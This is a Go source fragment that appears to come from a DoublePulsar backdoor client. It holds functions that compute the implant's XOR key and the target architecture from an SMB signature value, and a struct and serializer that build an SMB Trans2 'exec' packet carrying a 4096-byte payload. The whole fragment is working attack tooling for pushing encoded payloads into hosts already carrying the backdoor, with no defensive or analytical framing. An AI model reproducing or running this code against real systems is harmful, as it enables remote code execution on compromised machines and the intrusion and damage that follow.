func calculateDoublepulsarArch(s uint64) string {
	if s&0xffffffff00000000 == 0 {
		return "x86 (32-bit)"
	}
	return "x64 (64-bit)"
}

func ByteXor(data []byte, key uint32) []byte {
	// Convert key to 4-byte little-endian array
	keyBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(keyBytes, key)

	keyLength := len(keyBytes)

	// XOR operation
	result := make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		result[i] = data[i] ^ keyBytes[i%keyLength]
	}

	return result
}

func CalculateDoublePulsarXorKey(s uint32) uint32 {
	part1 := (s & 0xff00) | (s << 16)
	part2 := (s >> 16) | (s & 0xff0000)

	x := 2*s ^ ((part1 << 8) | (part2 >> 8))

	return x & 0xffffffff
}

func calculateDoublepulsarXorKeyTwo(s uint32) uint32 {
	x := (2 * s) ^ (((s&0xff00 | (s << 16)) << 8) | (((s >> 16) | s&0xff0000) >> 8))
	return x & 0xffffffff
}

type SmbDoublePulsarExecPacket struct {
	SmbMessageType   uint16
	SmbMessageLength uint16

	ProtocolHeader [4]byte
	SmbCommand     byte

	NtStatus uint32
	Flags    byte
	Flags2   uint16

	ProcessIDHigh uint16
	Signature     [8]byte

	Reserved   uint16
	TreeId     uint16
	ProcessID  uint16
	UserID     uint16
	MultipleID uint16

	// Trans2 header
	WordCount           byte
	TotalParameterCount uint16
	TotalDataCount      uint16
	MaxParameterCount   uint16
	MaxDataCount        uint16
	MaxSetupCount       byte

	Reserved1 byte
	Flags1    uint16
	Timeout   uint32
	Reserved2 uint16

	ParameterCount uint16
	ParamOffset    uint16
	DataCount      uint16
	DataOffset     uint16

	SetupCount byte
	Reserved3  byte
	Subcommand uint16

	ByteCount uint16
	Padding   byte

	SessionSetupParameters [12]byte
	SMBPayload             [4096]byte
}

func NewPacket() *SmbDoublePulsarExecPacket {
	p := &SmbDoublePulsarExecPacket{}

	p.ProtocolHeader = [4]byte{0xFF, 'S', 'M', 'B'}
	p.SmbCommand = 0x32

	p.Flags = 0x18
	p.Flags2 = 0xC007
	p.ProcessID = 0xFEFF
	p.MultipleID = 65

	p.WordCount = 15
	p.TotalParameterCount = 12
	p.MaxParameterCount = 1

	p.Timeout = 0x001a8925

	p.ParameterCount = 12
	p.ParamOffset = 66
	p.DataOffset = 78

	p.SetupCount = 1
	p.Subcommand = 0x000E

	return p
}

func (p *SmbDoublePulsarExecPacket) ToBytes() ([]byte, error) {
	buf := new(bytes.Buffer)

	write := func(data interface{}) {
		binary.Write(buf, binary.LittleEndian, data)
	}

	write(p.SmbMessageType)
	write(p.SmbMessageLength)

	buf.Write(p.ProtocolHeader[:])
	buf.WriteByte(p.SmbCommand)

	write(p.NtStatus)
	buf.WriteByte(p.Flags)
	write(p.Flags2)
	write(p.ProcessIDHigh)
	buf.Write(p.Signature[:])

	write(p.Reserved)
	write(p.TreeId)
	write(p.ProcessID)
	write(p.UserID)
	write(p.MultipleID)

	buf.WriteByte(p.WordCount)
	write(p.TotalParameterCount)
	write(p.TotalDataCount)
	write(p.MaxParameterCount)
	write(p.MaxDataCount)
	buf.WriteByte(p.MaxSetupCount)

	buf.WriteByte(p.Reserved1)
	write(p.Flags1)
	write(p.Timeout)
	write(p.Reserved2)

	write(p.ParameterCount)
	write(p.ParamOffset)
	write(p.DataCount)
	write(p.DataOffset)

	buf.WriteByte(p.SetupCount)
	buf.WriteByte(p.Reserved3)
	write(p.Subcommand)

	write(p.ByteCount)
	buf.WriteByte(p.Padding)

	buf.Write(p.SessionSetupParameters[:])
	buf.Write(p.SMBPayload[:])

	return buf.Bytes(), nil
}

func hexdump(data []byte, width int) {
	for i := 0; i < len(data); i += width {
		end := i + width
		if end > len(data) {
			end = len(data)
		}
		fmt.Printf("%04x  ", i)
		for j := i; j < end; j++ {
			fmt.Printf("%02x ", data[j])
		}
		fmt.Println()
	}
}

